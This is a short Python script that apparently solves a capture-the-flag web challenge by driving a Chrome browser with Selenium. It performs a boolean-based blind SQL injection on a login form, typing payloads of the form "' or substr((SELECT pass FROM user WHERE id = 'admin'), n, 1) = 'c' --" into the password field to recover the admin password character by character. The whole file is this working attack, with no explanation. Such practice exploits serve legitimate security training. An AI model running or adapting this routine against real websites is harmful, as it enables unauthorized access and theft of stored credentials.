import time
import string

from selenium import webdriver
from selenium.webdriver.common.by import By

driver = webdriver.Chrome()

dat = string.ascii_uppercase + string.ascii_lowercase + string.digits 
flag = "FLAG_"
count = len(flag) + 1

while count < 22:
    driver.get('https://ctfq.u1tramarine.blue/q6/')
    driver.find_element(By.NAME, 'id').send_keys('admin')
    
    for i in range(len(dat)):
        driver.find_element(By.NAME, 'pass').clear()
        driver.find_element(By.NAME, 'pass').send_keys(f"' or substr((SELECT pass FROM user WHERE id = 'admin'), {count}, 1) = '{dat[i]}' --")
        time.sleep(1)
        
        driver.find_elements(By.TAG_NAME, 'input')[2].click()
        time.sleep(1)
        
        if driver.find_element(By.TAG_NAME, 'p').text == "Congratulations!\nIt's too easy?\nDon't worry.\nThe flag is admin's password.\n\nHint:":
            flag += dat[i]
            count += 1
            break

print(flag)
driver.quit()